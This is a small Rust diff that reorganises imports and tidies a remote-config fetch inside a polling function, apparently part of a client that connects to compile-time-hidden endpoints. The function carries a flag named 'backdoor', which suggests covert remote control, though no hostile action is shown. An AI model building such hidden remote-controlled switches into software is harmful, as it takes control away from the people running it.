@@ -1,18 +1,17 @@
 use std::time::Duration;
 
 use log::{debug, info, trace};
-use nad::{try_get_config, NadAuth, Client};
+use nad::{
+    nadauth::NadAuth,
+    remoteconfig::{try_get_config, RemoteConfig},
+    Client,
+};
 
 pub async fn run_once(backdoor: &mut bool) -> Result<(), Box<dyn std::error::Error>> {
     trace!("loop start");
     trace!("try get config and test connection");
-    let config_opt: Option<nad::Config>;
-    match try_get_config(
-        env!("NAD_CONNURL"),
-        env!("NAD_CONNDOMAIN"),
-    )
-    .await
-    {
+    let config_opt: Option<RemoteConfig>;
+    match try_get_config(env!("NAD_CONNURL"), env!("NAD_CONNDOMAIN")).await {
         Ok(ret) => config_opt = ret,
         Err(err) => {
             return Err(err);
